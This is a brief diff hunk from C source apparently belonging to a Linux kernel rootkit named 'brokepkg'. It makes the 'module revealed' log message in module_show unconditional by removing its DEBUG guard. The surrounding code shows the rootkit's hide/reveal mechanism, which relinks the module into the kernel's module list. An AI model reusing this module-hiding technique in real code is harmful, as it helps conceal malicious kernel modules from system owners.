@@ -12,9 +12,7 @@ static short isHidden = 0;
 void module_show(void) {
   list_add(&THIS_MODULE->list, prev_module);
   isHidden = 0;
-#ifdef DEBUG
   PR_INFO("brokepkg: module revealed");
-#endif
 }
 
 void module_hide(void) {
